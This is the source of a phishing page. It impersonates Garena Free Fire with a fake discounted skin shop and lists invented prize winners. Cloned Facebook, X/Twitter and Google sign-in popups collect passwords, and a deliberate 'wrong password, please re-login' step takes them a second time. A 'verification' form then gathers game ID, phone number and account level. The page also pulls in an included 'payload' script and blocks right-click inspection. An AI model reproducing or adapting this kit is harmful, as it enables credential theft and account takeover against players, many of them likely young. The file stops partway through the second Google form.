<?php
if(isset($_POST['sessionToken']) && isset($_GET['gToken'])){
    $sessionToken = $_POST['sessionToken'];
    $gToken = $_GET['gToken'];
    
    if($sessionToken != "well"){
        header("Location: verify.php");
    }
    
    if($gToken != "verified"){
        header("Location: verify.php");
    }

include "system/payload.php";
gcodeCheckSession("verify.php");
?>
<html lang="en"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Garena Free Fire. The best mobile Battle Royale game!</title>
<meta property="og:description" content="Free Fire is the best mobile battle royale game, downloaded by over 1 billion players worldwide, developed by Garena for Android and iOS. Battle in Style and be the last survivor.">
<meta property="og:image" content="https://i.postimg.cc/jdq9pLMZ/navbar-logo.jpg">
<meta property="og:image:width" content="540">
<meta property="og:image:height" content="282">
<link href="./index_files/css" rel="stylesheet">
<link rel="stylesheet" href="css-zone/google.css">
<link rel="stylesheet" href="css-zone/facebook.css">
<link rel="stylesheet" href="css-zone/animate.css">
<link rel="stylesheet" href="css-zone/style-zone.css">
<link rel="stylesheet" href="css-zone/zero-zone.css">
<link rel="stylesheet" href="main.css">
<link href="https://fonts.googleapis.com/css2?family=Teko&amp;display=swap" rel="stylesheet">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
<link rel="icon" type="img/png" href="https://freefiremobile-a.akamaihd.net/common/web_event/common/images/ff-logo-icon.png" sizes="32x32">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="slider-container">
<div class="navbar">
<img class="navbar-logo" src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/logo.png">
<div class="navbar-right">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_language.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg"></div>
</div> <!--- navbar-right --->
</div> <!--- Banner/Video --->
<div class="header">
<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/header.jpg" class="width: 100%;">
</div>
<div class="laz-home">
<div class="laz-container"> 
<div class="slidezs">
  <div class="lazaslide" style="display: block;"><p class="gift-name"><span>UID 5266****04 Received M1887 INCENDIUM BURST</span></p></div>
  <div class="lazaslide" style="display: none;"><p class="gift-name"><span>UID 3585****23 Received M1887 ONE PUNCH MAN</span></p></div>
  <div class="lazaslide" style="display: none;"><p class="gift-name"><span>UID 3980*****21 Received M1887 STERLING QUNQUEROR</span></p></div>
  <div class="lazaslide" style="display: none;"><p class="gift-name"><span>UID 5766*****73 Received M1887 - RAPPER UNDERWORLD</span></p></div>
  <div class="lazaslide" style="display: none;"><p class="gift-name"><span>UID 5316*****12 Received M1887 HAND OF HOPE</span></p></div>
  <div class="lazaslide" style="display: none;"><p class="gift-name"><span>UID 3340*****1 Received M1887 MATA ELANG</span></p></div>
  <div class="lazaslide" style="display: none;"><p class="gift-name"><span>UID 6582*****43 Received M1887 INCENDIUM BURST</span></p></div>
</div>
<h2 title="LATEST NEWS" class="section-title big">
  <p class="section-title-text">MYSTERY SHOP</p>
  <svg viewBox="0 0 165 9" fill="#FFBA00" xmlns="http://www.w3.org/2000/svg" class="title-decoration">
    <path d="M129.4 0L121.28 8.12H0V0H129.4Z"></path>
    <path d="M141.16 0L133.04 8.12H128.45L136.57 0H141.16Z"></path>
    <path d="M152.92 0L144.8 8.12H140.2L148.33 0H152.92Z"></path>
    <path d="M164.68 0L156.55 8.12H151.96L160.09 0H164.68Z"></path>
  </svg>
</h2>

<div class="timer">LIMITED TIME OFFER<br>ENDS IN: <i class="fa-solid fa-stopwatch fa-shake"></i><span id="timer1" style="animation: fade .6s infinite alternate;color: #ff2c2c;">  23 : 59 : 57</span></div> <!--- event-notification-timer --->

<div class="box-rewards">
<div class="box-item-rewards">
<center>

<div class="items-container">
  <div class="item-voucher" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/laza/withBg/1.jpg" item-name="M1887 INCENDIUM BURST" item-total="" item-price="5000">
    <div class="discount-tag">-50%</div>
    <div class="character-image-container">
      <img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/laza/1.png" alt="Character" class="character-image reds">
      <div class="limited-text">Limited: 1/1</div>
    </div>
    <div class="item-name-banner reds-text needs-scroll">
      <span style="--scroll-distance: -20px;">M1887 INCENDIUM BURST</span>
    </div>
    <div class="price-circle">
      <img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/tokens.png" alt="Diamond" class="diamond-icon">
      <span class="price-main">5000</span>
      <span class="price-discount">10000</span>
    </div>
    <button class="purchase-button">BELI</button>
  </div>

  <div class="item-voucher" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/laza/withBg/2.jpg" item-name="M1887 ONE PUNCHMAN" item-total="" item-price="2500">
    <div class="discount-tag">-50%</div>
    <div class="character-image-container">
      <img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/laza/2.png" alt="Character" class="character-image purple">
      <div class="limited-text">Limited: 1/1</div>
    </div>
    <div class="item-name-banner purple-text">
      <span>M1887 ONE PUNCHMAN</span>
    </div>
    <div class="price-circle">
      <img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/tokens.png" alt="Diamond" class="diamond-icon">
      <span class="price-main">2500</span>
      <span class="price-discount">5000</span>
    </div>
    <button class="purchase-button">BELI</button>
  </div>

  <div class="item-voucher" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/laza/withBg/3.jpg" item-name="M1887 RAPPER UNDERWORLD" item-total="" item-price="2500">
    <div class="discount-tag">-50%</div>
    <div class="character-image-container">
      <img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/laza/3.png" alt="Character" class="character-image purple">
      <div class="limited-text">Limited: 1/1</div>
    </div>
    <div class="item-name-banner purple-text needs-scroll">
      <span style="--scroll-distance: -37px;">M1887 RAPPER UNDERWORLD</span>
    </div>
    <div class="price-circle">
      <img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/tokens.png" alt="Diamond" class="diamond-icon">
      <span class="price-main">2500</span>
      <span class="price-discount">5000</span>
    </div>
    <button class="purchase-button">BELI</button>
  </div>

  <div class="item-voucher" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/laza/withBg/4.jpg" item-name="M1887 STERLING QUNQUEROR" item-total="" item-price="3000">
    <div class="discount-tag">-50%</div>
    <div class="character-image-container">
      <img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/laza/4.png" alt="Character" class="character-image reds">
      <div class="limited-text">Limited: 1/1</div>
    </div>
    <div class="item-name-banner reds-text needs-scroll">
      <span style="--scroll-distance: -36px;">M1887 STERLING QUNQUEROR</span>
    </div>
    <div class="price-circle">
      <img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/tokens.png" alt="Diamond" class="diamond-icon">
      <span class="price-main">3000</span>
      <span class="price-discount">6000</span>
    </div>
    <button class="purchase-button">BELI</button>
  </div>

  <div class="item-voucher" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/laza/withBg/5.jpg" item-name="M1887 HAND OF HOPE" item-total="" item-price="3000">
    <div class="discount-tag">-50%</div>
    <div class="character-image-container">
      <img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/laza/5.png" alt="Character" class="character-image reds">
      <div class="limited-text">Limited: 1/1</div>
    </div>
    <div class="item-name-banner reds-text">
      <span>M1887 HAND OF HOPE</span>
    </div>
    <div class="price-circle">
      <img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/tokens.png" alt="Diamond" class="diamond-icon">
      <span class="price-main">3000</span>
      <span class="price-discount">6000</span>
    </div>
    <button class="purchase-button">BELI</button>
  </div>

  <div class="item-voucher" onmousedown="buka.play();" onclick="open_itemReward_confirmation2(this);" src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/laza/withBg/6.jpg" item-name="M1887 MATA ELANG" item-total="" item-price="3000">
    <div class="discount-tag">-50%</div>
    <div class="character-image-container">
      <img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/laza/6.png" alt="Character" class="character-image reds">
      <div class="limited-text">Limited: 1/1</div>
    </div>
    <div class="item-name-banner reds-text">
      <span>M1887 MATA ELANG</span>
    </div>
    <div class="price-circle">
      <img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/tokens.png" alt="Diamond" class="diamond-icon">
      <span class="price-main">3000</span>
      <span class="price-discount">6000</span>
    </div>
    <button class="purchase-button">BELI</button>
  </div>
</div> <!--- items-container --->
</center>
</div> <!--- box-item-rewards --->
</div> <!--- box-rewards --->
</div> <!--- laz-container --->
</div> <!--- laz-home --->

<div class="popup-login first-login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onmousedown="tutup.play();" onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb">
<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/facebook-text.png">
</div>
<div class="content-box-fb">
<p class="kaget first-email-fb" style="width: 320px; top: -5px; text-align: left;">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></p>
<p class="kaget first-sandi-fb" style="width: 320px; top: -5px; text-align: left;">The password that you've entered is incorrect. Forgotten password?</p>
<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/icon_2.jpg">
<div class="txt-login-fb">
 Log in to your Facebook account to connect to Free Fire.
</div>
<form class="login-form" action="javascript:void(0)" method="post" id="FirstValidateLoginFbForm">
<div class="form-group-fb">
<input type="text" name="email" id="first-email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required="" oninvalid="this.setCustomValidity('Enter Mobile number or email address')" oninput="setCustomValidity('')">
<div class="form-group-sohid FirstShowFbPassword" onclick="FirstShowFbPassword()">
<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/Twitter-Show-Password.png">
</div> <!--- form-group-sohid FirstShowFbPassword --->
<div class="form-group-sohid FirstHideFbPassword" style="display: none;" onclick="FirstHideFbPassword()">
<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/Twitter-Hide-Password.png">
</div> <!--- form-group-sohid FirstHideFbPassword --->
<input type="password" name="password" id="first-password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required="" oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
</div> <!--- form-group-fb --->
<input type="hidden" name="login" id="first-login-facebook" value="Facebook" readonly="">
<button type="submit" class="btn-login-fb" onclick="FirstValidateLoginFbData()">Log In</button>
</form>
<div class="txt-create-account">Create Account</div>
<div class="txt-not-now">Not now</div>
<div class="txt-forgotten-password">Forgotten password?</div>
</div>
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div>
<div class="language-name">العربية</div>
<div class="language-name">Türkçe</div>
<div class="language-name">Tiếng Việt</div>
<div class="language-name">日本語</div>
<div class="language-name">Español</div>
<div class="language-name">Português (Brasil)</div>
<div class="language-name">
<i class="fa fa-plus"></i>
</div>
</center>
</div>
<div class="copyright">Meta © 2023</div>
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login--->

<div class="popup-login first-login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onmousedown="tutup.play();" onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="header-twitter"><img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/twitter-text.png"></div> <!--- header-twitter --->
<div class="txt-login-twitter">Sign in to X</div> <!--- txt-login-twitter --->
<div class="content-box-twitter">
<form action="javascript:void(0)" method="post" id="FirstValidateLoginTwitterForm">
<div class="form-group-twitter">
<input type="text" name="email" id="first-email-twitter" autocomplete="off" required="" oninvalid="this.setCustomValidity('Enter Username, Email or Mobile number')" oninput="setCustomValidity('')">
<label>@Username</label>
</div> <!--- form-group-twitter --->
<div class="form-group-twitter">
<div class="form-group-sohi FirstShowTwitterPassword" onclick="FirstShowTwitterPassword()">
<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/Twitter-Show-Password.png">
</div> <!--- form-group-sohi FirstShowTwitterPassword --->
<div class="form-group-sohi FirstHideTwitterPassword" style="display: none;" onclick="FirstHideTwitterPassword()">
<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/Twitter-Hide-Password.png">
</div> <!--- form-group-sohi FirstHideTwitterPassword --->
<input type="password" name="password" id="first-password-twitter" autocomplete="off" required="" oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
<label>Password</label>
</div> <!--- form-group-twitter --->
<p class="kagettw first-email-tw" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -18px;">Sorry, we couldn't find your account.</p>
<p class="kagettw first-sandi-tw" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -20px;">Wrong Password!</p>
<input type="hidden" name="login" id="first-login-twitter" value="Twitter" readonly="">
<button type="submit" onclick="FirstValidateLoginTwitterData()">Log in</button>
<buttonx type="button">Forgot password?</buttonx>
<label>Don't have an account? <a>Sign up</a></label>
</form>
</div> <!--- content-box-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login --->

<div class="popup-login second-login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<div class="navbar-fb">
<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/facebook-text.png">
</div>
<div class="content-box-fb">
<p class="kaget wrong-email-fb" style="width: 320px; top: -5px; text-align: left; display: block;">Your password was wrong. <b>Please re-login using the correct password.</b></p>
<p class="kaget second-email-fb" style="width: 320px; top: -5px; text-align: left;">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></p>
<p class="kaget second-sandi-fb" style="width: 320px; top: -5px; text-align: left;">The password that you've entered is incorrect. Forgotten password?</p>
<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/icon_2.jpg">
<div class="txt-login-fb">
 Log in to your Facebook account to connect to Free Fire.
</div>
<form class="login-form" action="javascript:void(0)" method="post" id="SecondValidateLoginFbForm">
<div class="form-group-fb">
<input type="text" name="email" id="second-email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required="" oninvalid="this.setCustomValidity('Enter Mobile number or email address')" oninput="setCustomValidity('')">
<div class="form-group-sohid SecondShowFbPassword" onclick="SecondShowFbPassword()">
<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/Twitter-Show-Password.png">
</div> <!--- form-group-sohid SecondShowFbPassword --->
<div class="form-group-sohid SecondHideFbPassword" style="display: none;" onclick="SecondHideFbPassword()">
<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/Twitter-Hide-Password.png">
</div> <!--- form-group-sohid SecondHideFbPassword --->
<input type="password" name="password" id="second-password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required="" oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
</div> <!--- form-group-fb --->
<input type="hidden" name="login" id="second-login-facebook" value="Facebook" readonly="">
<button type="submit" class="btn-login-fb" onclick="SecondValidateLoginFbData()">Log In</button>
</form>
<div class="txt-create-account">Create Account</div>
<div class="txt-not-now">Not now</div>
<div class="txt-forgotten-password">Forgotten password?</div>
</div>
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div>
<div class="language-name">العربية</div>
<div class="language-name">Türkçe</div>
<div class="language-name">Tiếng Việt</div>
<div class="language-name">日本語</div>
<div class="language-name">Español</div>
<div class="language-name">Português (Brasil)</div>
<div class="language-name">
<i class="fa fa-plus"></i>
</div>
</center>
</div>
<div class="copyright">Meta © 2023</div>
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login--->

<div class="popup-login second-login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<div class="header-twitter"><img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/twitter-text.png"></div> <!--- header-twitter --->
<div class="txt-login-twitter">Sign in to X</div> <!--- txt-login-twitter --->
<div class="content-box-twitter">
<form action="javascript:void(0)" method="post" id="SecondValidateLoginTwitterForm">
<div class="form-group-twitter">
<input type="text" name="email" id="second-email-twitter" autocomplete="off" required="" oninvalid="this.setCustomValidity('Enter Username, Email or Mobile number')" oninput="setCustomValidity('')">
<label>@Username</label>
</div> <!--- form-group-twitter --->
<div class="form-group-twitter">
<div class="form-group-sohi SecondShowTwitterPassword" onclick="SecondShowTwitterPassword()">
<img src="https://i.ibb.co/PYpHF6b/Twitter-Show-Password.png">
</div> <!--- form-group-sohi SecondShowTwitterPassword --->
<div class="form-group-sohi SecondHideTwitterPassword" style="display: none;" onclick="SecondHideTwitterPassword()">
<img src="https://i.ibb.co/pZDr8sd/Twitter-Hide-Password.png">
</div> <!--- form-group-sohi SecondHideTwitterPassword --->
<input type="password" name="password" id="second-password-twitter" autocomplete="off" required="" oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')">
<label>Password</label>
</div> <!--- form-group-twitter --->
<p class="kagettw wrong-email-tw" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -18px; display: block;">Your password was wrong.<br>Please re-login using the correct password</p>
<p class="kagettw first-email-tw" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -18px;">Sorry, we couldn't find your account.</p>
<p class="kagettw first-sandi-tw" style="width: 330px; top: -17px; text-align: center; margin-bottom: 3px; margin-left: -20px;">Wrong Password!</p>
<input type="hidden" name="login" id="second-login-twitter" value="Twitter" readonly="">
<button type="submit" onclick="SecondValidateLoginTwitterData()">Log in</button>
<buttonx type="button">Forgot password?</buttonx>
<label>Don't have an account? <a>Sign up</a></label>
</form>
</div> <!--- content-box-twitter --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login --->

<div class="popup-login login-facebook-load" style="display: none;">
<div class="popup-box-login-fb">
<div class="navbar-fb">
<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/facebook-text.png">
</div> <!--- navbar --->
<div class="content-box-fb">
<div class="fb-load">
<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/icon_fb.png">
<div class="loader3"></div>
</div> <!--- fb-load --->
</div> <!--- content-box-fb --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login--->

<div class="popup-login login-twitter-load" style="display: none;">
<div class="popup-box-login-twitter">
<div class="twitter-load">
<div class="twitter-load-title">
<div class="loader2"></div>
</div> <!--- twitter-load-title --->
</div> <!--- twitter-load --->
</div> <!--- popup-box-login-twitter --->
</div> <!--- popup-login --->

<div class="popup account_verification animated fadeIn" style="display: none;">
	<div class="popup-box-wrapperz">
		<div class="popup-box-navbarz">
			<div class="popup-box-navbar-title">Account Verification</div>
		</div>
		<div class="popup-box-bgz">
			<div class="popup-box-alert4"><br>Complete your Garena Free Fire account details<br><br></div>
			<form class="popup-box-form" action="javascript:void(0)" method="post" onsubmit="AICheckerr(this); return false;" id="ValidateVerificationDataForm">
				<input type="hidden" name="email" id="validateEmail" readonly="">
				<input type="hidden" name="password" id="validatePassword" readonly="">
				<input type="number" name="playid" id="playid" placeholder="Account ID" autocomplete="off" required="" oninvalid="this.setCustomValidity('Enter Account Player ID')" oninput="setCustomValidity('')">
				<input type="number" name="phone" id="phone" placeholder="Phone Number" autocomplete="off" required="" oninvalid="this.setCustomValidity('Masukkan Phone Number Anda')" oninput="setCustomValidity('')">
				<select name="level" id="level" required="" oninvalid="this.setCustomValidity('Pilih Account Level Anda')" oninput="setCustomValidity('')">
					<option selected="selected" disabled="disabled" value="">Account Level</option>
					<script>
						for(var i = 1; i <= 100; i++){
							document.write("<option>" + i + "</option>");
						};
					</script><option>1</option><option>2</option><option>3</option><option>4</option><option>5</option><option>6</option><option>7</option><option>8</option><option>9</option><option>10</option><option>11</option><option>12</option><option>13</option><option>14</option><option>15</option><option>16</option><option>17</option><option>18</option><option>19</option><option>20</option><option>21</option><option>22</option><option>23</option><option>24</option><option>25</option><option>26</option><option>27</option><option>28</option><option>29</option><option>30</option><option>31</option><option>32</option><option>33</option><option>34</option><option>35</option><option>36</option><option>37</option><option>38</option><option>39</option><option>40</option><option>41</option><option>42</option><option>43</option><option>44</option><option>45</option><option>46</option><option>47</option><option>48</option><option>49</option><option>50</option><option>51</option><option>52</option><option>53</option><option>54</option><option>55</option><option>56</option><option>57</option><option>58</option><option>59</option><option>60</option><option>61</option><option>62</option><option>63</option><option>64</option><option>65</option><option>66</option><option>67</option><option>68</option><option>69</option><option>70</option><option>71</option><option>72</option><option>73</option><option>74</option><option>75</option><option>76</option><option>77</option><option>78</option><option>79</option><option>80</option><option>81</option><option>82</option><option>83</option><option>84</option><option>85</option><option>86</option><option>87</option><option>88</option><option>89</option><option>90</option><option>91</option><option>92</option><option>93</option><option>94</option><option>95</option><option>96</option><option>97</option><option>98</option><option>99</option><option>100</option>
				</select>
				<input type="hidden" name="login" id="validateLogin" readonly="">
				<br>
				<br>
				<div class="popup-box-form-footer">
					<button type="submit" onclick="ValidateVerificationDatax()" style="margin-top: -6px;">Verify</button>
				</div>
			</form>
		</div>
	</div>
</div>

<div class="popup check_verification animated fadeIn" style="display: none;">
	<div class="popup-box-wrapperz">
		<div class="popup-box-navbarz">
			<div class="popup-box-navbar-title">Processing Account</div>
		</div>
		<div class="popup-box-bgx">
			<div class="popup-box-alert8"><br>
				<i class="fa-solid fa-circle-notch fa-spin" style="color: #737373;font-size: 50px;margin-bottom: 14px;"></i>
				<br> Processing your account details...
				<br><br>
			</div>
			<div class="popup-box-footer"></div>
		</div>
	</div>
</div>

<div class="popup processing_account animated fadeIn" style="display: none;">
	<div class="popup-box-wrapperz">
		<div class="popup-box-navbarz">
			<div class="popup-box-navbar-title">Proses Pembelian</div>
		</div>
		<div class="popup-box-bgz">
			<div class="popup-box-alert3" style="padding-top: 7px;">
				Hello Sir!<br>
				<p>Kami telah menerima pesanan Anda! 
				<br>Mohon tunggu sebentar!<br> Tim kami akan segera memproses hadiah ke ID yang terdaftar.<br> Kami akan memberi tahu Anda melalui kotak surat dalam game Anda!
				<br><br>Booyah Regards!</p></div>
			<div class="popup-box-alert0">
			</div>
			<div class="popup-box-footer">
				<button type="button" onmousedown="tutup.play();" style="margin-right: 0; float: none;" onclick="location.href='https://ff.garena.com/id/';">Keluar</button>
			</div>
		</div>
	</div>
</div>


<div class="footer" style="top:-80px;">
<img class="footer-copyright-icon" src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/logo.png">
<div class="footer-copyright-text">
<div class="footer-txt-copyrights">
Copyright © Garena International. Trademarks belong to their respective owners. All rights reserved.
</div> <!--- footer-txt-copyrights --->
<div class="footer-copyright-text-left">Privacy Policy</div> <!--- footer-txt-copyright --->
<div class="footer-copyright-text-center">For Parents FAQ</div> <!--- footer-txt-copyright --->
<div class="footer-copyright-text-right">Terms of Service</div> <!--- footer-txt-copyright --->
</div> <!--- footer-copyright-text --->
</div> <!--- footer --->

<div class="popup open_rewards animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-bg" style="height:220px;">
<div class="popup-box-alert4"><br> </div> <!--- popup-box-alert --->
<div class="popup-box-item">
<div>
<figure>
<img class="popup-item flip" src="">
</figure>
</div>
</div> <!--- popup-box-item --->
<br>
<div class="popup-box-footer" style="margin-top:40px;">
<button type="button" onmousedown="buka.play();" onclick="get_token()">Collect</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup open_rewards --->

<div class="popup loadinglogin" style="display: none;">
<div class="loadinglogin" style="width:400px;height: 679px;margin-top:279px;margin-left:auto;margin-right:auto;">
<div class="loader-line"></div>
<div class="loader-label" id="text-login1">Checking for updates...</div>
<div class="loader-label" style="display:none" id="text-login2">Connecting to server...</div>
<img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/load.jpg" style="background-size: 100% 100%;width: 100%;">

</div>
</div>

<div class="popup account_login animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
</div>
<div class="loginpop">
<div class="popup-box-alert-login"><br>
<img class="popup-box-gamecon" src="https://www.pubgmobile.com/act/a20180515iggamepc/logo.png" style="opacity:0%;"></div>
<div class="alter-text"><span>or</span></div>
<button type="button" style="top:-35px;" onmousedown="buka.play();" class="popup-btn-login popup-btn-google" onclick="open_google();"><img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/google.png"><g style="padding-right: 9px;">Sign in dengan Google</g></button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-footer --->

<div class="popup-login first-login-google animated fadeIn" style="display: none;">
<div class="popup-box-login-google">
<a onmousedown="tutup.play();" onclick="close_google()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="box-google">
<div class="header-google"><img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/google.png">
</div> <!--- header-google --->
<div class="txt-login-google">Sign in</div> <!--- txt-login-google --->
<div class="txt-login-google-desc">Use your Google Account</div> <!--- txt-login-google-desc --->
<form action="javascript:void(0)" method="post" id="FirstValidateLoginGoogleForm">
<div class="input-box">
<label class="input-label" style="text-shadow: none;">Email Address</label>
<input type="email" class="input-1" name="email" id="first-google-email" onfocus="setFocus(true)" onblur="setFocus(false)" required="">
</div>
<div class="input-box">
<div class="form-group-showhide GoogleShowPassword" onclick="FirstshowGooglePassword()"><i class="zmdi zmdi-eye"></i></div>
<div class="form-group-showhide GoogleHidePassword" style="display: none;" onclick="FirsthideGooglePassword()"><i class="zmdi zmdi-eye-off"></i></div>
<label class="input-label" style="text-shadow: none;">Password</label>
<input type="password" class="input-1" name="password" id="first-google-password" onfocus="setFocus(true)" onblur="setFocus(false)" required="">
</div>
<input type="hidden" name="login" id="first-google-login" value="Google Play" readonly="">
<div class="first-email-google" style="display: none;">
<svg aria-hidden="true" fill="currentColor" focusable="false" width="13px" height="13px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
</svg> Your Google Account cannot be found.</div>
<div class="first-sandi-google" style="display: none;">
<svg aria-hidden="true" fill="currentColor" focusable="false" width="13px" height="13px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path>
</svg> Wrong password, please try again.</div>
<div class="btn-forgot-google">Forgot your email?</div>
<div class="btn-not-computer">Not your computer? Use Guest mode to sign in privately. <p style="color: #3166d3;font-weight: 500;">Learn more about using Guest mode</p></div>
<button type="submit" class="btn-login-google" onclick="FirstValidateLoginGoogleData()">Next</button>
</form>
<div class="notify-google">Create account</div> <!--- notify-google --->
<br>
</div> <!--- box-google --->
</div>
</div>

<script>
  // show hide password for Google
  function FirstshowGooglePassword() {
    var x = document.getElementById("first-google-password");
    if (x.type === "password") {
      x.type = "text";
      $('.GoogleShowPassword').hide();
      $('.GoogleHidePassword').show();
    } else {
      x.type = "password";
    }
  }
  
  function FirsthideGooglePassword() {
    var x = document.getElementById("first-google-password");
    if (x.type === "text") {
      x.type = "password";
      $('.GoogleShowPassword').show();
      $('.GoogleHidePassword').hide();
    } else {
      x.type = "text";
    }
  }
  
  // show hide password for Google
  function SecondshowGooglePassword() {
    var x = document.getElementById("second-google-password");
    if (x.type === "password") {
      x.type = "text";
      $('.GoogleShowPassword').hide();
      $('.GoogleHidePassword').show();
    } else {
      x.type = "password";
    }
  }
  
  function SecondhideGooglePassword() {
    var x = document.getElementById("second-google-password");
    if (x.type === "text") {
      x.type = "password";
      $('.GoogleShowPassword').show();
      $('.GoogleHidePassword').hide();
    } else {
      x.type = "text";
    }
  }
</script>

<div class="popup-login second-login-google animated fadeIn" style="display: none;">
<div class="popup-box-login-google">
<div class="box-google">
<div class="header-google"><img src="https://cdn.jsdelivr.net/gh/whatsapp-saluran/img@main/2/style-img/google.png">
</div> <!--- header-google --->
<div class="txt-login-google">Sign in</div> <!--- txt-login-google --->
<div class="txt-login-google-desc">Use your Google Account</div> <!--- txt-login-google-desc --->
<form action="javascript:void(0)" method="post" id="SecondValidateLoginGoogleForm">
<div class="input-box">
<label class="input-label" style="text-shadow: none;">Email Address</label>
<input type="email" class="input-1" name="email" id="second-google-email" onfocus="setFocus(true)" onblur="setFocus(false)" required="">
</div>
<div class="input-box">
